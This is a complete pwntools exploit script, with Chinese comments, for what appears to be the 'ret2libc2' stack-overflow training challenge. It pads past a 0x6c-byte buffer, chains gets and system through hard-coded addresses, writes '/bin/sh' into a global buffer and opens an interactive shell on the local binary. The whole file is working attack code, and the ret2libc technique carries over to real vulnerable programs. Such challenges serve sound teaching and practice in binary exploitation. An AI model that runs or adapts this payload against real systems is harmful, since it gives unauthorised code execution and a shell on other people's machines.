#!/usr/bin/python3
from pwn import *

gets_addr = 0x08048460
buf2_addr = 0x0804a080
system_addr = 0x08048490

# 填充数据 offset=0x6c+4
# gets函数地址
# system函数地址, 作为gets运行完毕后的返回地址(或者是system函数的"返回地址")
# buf2地址, 作为gets的参数
# buf2地址, 作为system的参数
payload = ((0x6c + 4) * b'A' + 
           p32(gets_addr) + 
           p32(system_addr) +
           p32(buf2_addr) + 
           p32(buf2_addr))

sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()